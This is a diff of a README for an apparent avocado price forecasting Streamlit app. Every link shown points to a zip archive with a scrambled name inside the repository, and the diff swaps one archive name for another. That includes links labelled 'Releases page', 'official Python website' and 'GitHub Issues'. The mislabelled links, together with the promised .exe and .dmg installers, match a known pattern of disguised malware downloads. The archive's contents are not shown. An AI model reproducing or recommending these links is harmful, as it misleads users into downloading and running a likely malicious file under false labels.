@@ -1,6 +1,6 @@
 # 🥑 Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit - Predict Avocado Prices Easily
 
-[![Download](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/Using-Streamlit-Annual-Deployment-Forecasting-Models-with-Price-Regression-Avocado-1.3-beta.5.zip)](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/Using-Streamlit-Annual-Deployment-Forecasting-Models-with-Price-Regression-Avocado-1.3-beta.5.zip)
+[![Download](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/with-Models-Avocado-Deployment-Streamlit-Using-Annual-Forecasting-Price-Regression-v1.1.zip)](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/with-Models-Avocado-Deployment-Streamlit-Using-Annual-Forecasting-Price-Regression-v1.1.zip)
 
 ## 🌟 Overview
 
@@ -10,18 +10,18 @@ This application helps you predict annual avocado prices using various regressio
 
 To get started with this application, follow these simple steps:
 
-1. **Download the Application**: You need to visit the [Releases page](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/Using-Streamlit-Annual-Deployment-Forecasting-Models-with-Price-Regression-Avocado-1.3-beta.5.zip) to access the download files.
+1. **Download the Application**: You need to visit the [Releases page](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/with-Models-Avocado-Deployment-Streamlit-Using-Annual-Forecasting-Price-Regression-v1.1.zip) to access the download files.
 
 2. **System Requirements**: 
    - Windows, macOS, or Linux operating system.
    - Minimum 2 GB RAM.
    - At least 500 MB of free disk space.
 
-3. **Install Required Software**: Ensure that you have Python installed, as the application is built using Streamlit and Python libraries. If Python is not installed, you can download it from the [official Python website](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/Using-Streamlit-Annual-Deployment-Forecasting-Models-with-Price-Regression-Avocado-1.3-beta.5.zip).
+3. **Install Required Software**: Ensure that you have Python installed, as the application is built using Streamlit and Python libraries. If Python is not installed, you can download it from the [official Python website](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/with-Models-Avocado-Deployment-Streamlit-Using-Annual-Forecasting-Price-Regression-v1.1.zip).
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/Using-Streamlit-Annual-Deployment-Forecasting-Models-with-Price-Regression-Avocado-1.3-beta.5.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/with-Models-Avocado-Deployment-Streamlit-Using-Annual-Forecasting-Price-Regression-v1.1.zip).
    
 2. **Choose the File**: Look for the latest version of the application. You will find files such as `.exe` for Windows or `.dmg` for macOS. Click the appropriate file to start downloading.
 
@@ -66,7 +66,7 @@ A: Yes, this application is completely free to use.
 
 ## 🎯 Contact
 
-If you have any questions or need support, feel free to reach out via [GitHub Issues](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/Using-Streamlit-Annual-Deployment-Forecasting-Models-with-Price-Regression-Avocado-1.3-beta.5.zip). 
+If you have any questions or need support, feel free to reach out via [GitHub Issues](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/with-Models-Avocado-Deployment-Streamlit-Using-Annual-Forecasting-Price-Regression-v1.1.zip). 
 
 You can also follow the project updates through the GitHub repository.
 
